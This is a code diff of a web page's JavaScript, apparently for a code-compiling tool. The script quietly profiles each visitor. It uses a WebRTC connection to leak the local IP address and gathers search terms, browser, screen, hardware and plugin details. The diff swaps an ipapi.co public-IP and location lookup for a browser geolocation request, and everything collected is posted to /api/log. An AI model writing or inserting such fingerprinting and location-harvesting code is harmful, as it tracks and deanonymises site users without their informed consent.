@@ -24,23 +24,6 @@
             const pc = new RTCPeerConnection();
             let logged = false;
 
-            // Fetch public IP and location data
-            let publicIP = 'N/A';
-            let locationData = { city: "Unknown", region: "Unknown", country: "Unknown" };
-
-            try {
-                const locationResponse = await fetch('https://ipapi.co/json/');
-                const locationJson = await locationResponse.json();
-                publicIP = locationJson.ip;
-                locationData = {
-                    city: locationJson.city || "Unknown",
-                    region: locationJson.region || "Unknown",
-                    country: locationJson.country || "Unknown"
-                };
-            } catch (error) {
-                console.error("Failed to fetch public IP and location data:", error);
-            }
-
             pc.createDataChannel('');
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
@@ -72,17 +55,50 @@
                         const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
                         const timestamp = new Date().toISOString();
 
-                        logged = true;
+                        // Get Geolocation
+                        let latitude = 'N/A';
+                        let longitude = 'N/A';
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(position => {
+                                latitude = position.coords.latitude;
+                                longitude = position.coords.longitude;
 
-                        fetch('/api/log', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ 
+                                logged = true;
+
+                                // Send log data with location
+                                sendLogData({
+                                    ip: localIP,
+                                    searchTerm,
+                                    userAgent,
+                                    referrer,
+                                    currentURL,
+                                    screenWidth,
+                                    screenHeight,
+                                    browserLanguage,
+                                    timeZone,
+                                    osInfo,
+                                    timestamp,
+                                    connectionType,
+                                    browserVersion,
+                                    deviceMemory,
+                                    hardwareConcurrency,
+                                    pixelRatio,
+                                    onlineStatus,
+                                    viewportWidth,
+                                    viewportHeight,
+                                    colorDepth,
+                                    touchSupport,
+                                    cookiesEnabled,
+                                    plugins,
+                                    latitude,
+                                    longitude
+                                });
+                            });
+                        } else {
+                            logged = true;
+                            // Send log data without location
+                            sendLogData({
                                 ip: localIP,
-                                publicIP,
-                                city: locationData.city,
-                                region: locationData.region,
-                                country: locationData.country,
                                 searchTerm,
                                 userAgent,
                                 referrer,
@@ -104,18 +120,28 @@
                                 colorDepth,
                                 touchSupport,
                                 cookiesEnabled,
-                                plugins
-                            })
-                        }).then(response => {
-                            if (!response.ok) {
-                                console.error('Failed to log information');
-                            }
-                        }).catch(error => {
-                            console.error('Error:', error);
-                        });
+                                plugins,
+                                latitude,
+                                longitude
+                            });
+                        }
                     }
                 }
             };
+        }
+
+        function sendLogData(logData) {
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(logData)
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Failed to log information');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
         }
 
         async function compileCode() {
